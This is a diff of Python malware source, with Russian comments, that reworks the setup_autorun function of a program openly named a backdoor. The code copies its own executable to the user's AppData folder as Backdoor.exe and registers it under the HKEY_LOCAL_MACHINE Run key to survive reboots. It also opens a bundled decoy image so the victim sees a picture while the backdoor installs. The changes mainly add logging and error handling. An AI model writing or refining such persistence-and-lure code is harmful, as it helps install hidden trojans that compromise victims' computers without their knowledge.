@@ -174,46 +174,50 @@ def connection():
 
 
 def setup_autorun():
-    location = os.environ["APPDATA"] + "\\Backdoor.exe"
-    if not os.path.exists(location):
-        shutil.copyfile(sys.executable, location)
+    try:
+        location = os.environ["APPDATA"] + "\\Backdoor.exe"
+        logging.info(f"[+] Проверяем наличие файла: {location}")
+        
+        # Если файл отсутствует, копируем исполняемый файл
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            logging.info(f"[+] Файл скопирован в {location}")
+        
+        # Пытаемся добавить запись в реестр
         try:
             with winreg.OpenKey(
-                winreg.HKEY_LOCAL_MACHINE,  # Изменено на локальную машину
+                winreg.HKEY_LOCAL_MACHINE,  # Локальная машина
                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                 0,
                 winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY,  # Учет 64-битной системы
             ) as key:
                 winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
-                logging.info(f"[+] Автозапуск добавлен: {location}")
+                logging.info(f"[+] Запись в реестр добавлена: {location}")
         except PermissionError:
-            logging.error("[!!] Недостаточно прав для записи в HKEY_LOCAL_MACHINE")
+            logging.error("[!!] Недостаточно прав для записи в HKEY_LOCAL_MACHINE.")
+        except FileNotFoundError as e:
+            logging.error(f"[!!] Не удалось найти раздел реестра: {e}")
         except Exception as e:
             logging.error(f"[!!] Ошибка записи в реестр: {e}")
+        
+        # Открываем картинку, если она есть
         try:
             if hasattr(sys, "_MEIPASS"):
                 image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
             else:
                 image_path = os.path.join(os.getcwd(), "aaa.jpg")
+            logging.info(f"[+] Проверяем наличие картинки: {image_path}")
+            
             if os.path.exists(image_path):
                 subprocess.Popen(["start", image_path], shell=True)
-                logging.info("[+] Картинка открыта при запуске")
+                logging.info("[+] Картинка успешно открыта.")
+            else:
+                logging.error("[!!] Картинка не найдена.")
         except Exception as e:
-            logging.error(f"[!!] Ошибка открытия картинки: {e}")
+            logging.error(f"[!!] Ошибка при открытии картинки: {e}")
 
-    try:
-        if hasattr(sys, "_MEIPASS"):
-            image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
-        else:  
-            image_path = os.path.join(os.getcwd(), "aaa.jpg")
-
-        if os.path.exists(image_path):
-            subprocess.Popen(["start", image_path], shell=True)
-            logging.info(f"[+] Картинка успешно открыта: {image_path}")
-        else:
-            logging.error(f"[!!] Картинка не найдена по пути: {image_path}")
     except Exception as e:
-        logging.error(f"[!!] Ошибка при открытии картинки: {e}")
+        logging.error(f"[!!] Общая ошибка в setup_autorun: {e}")
 
 
 if __name__ == "__main__":
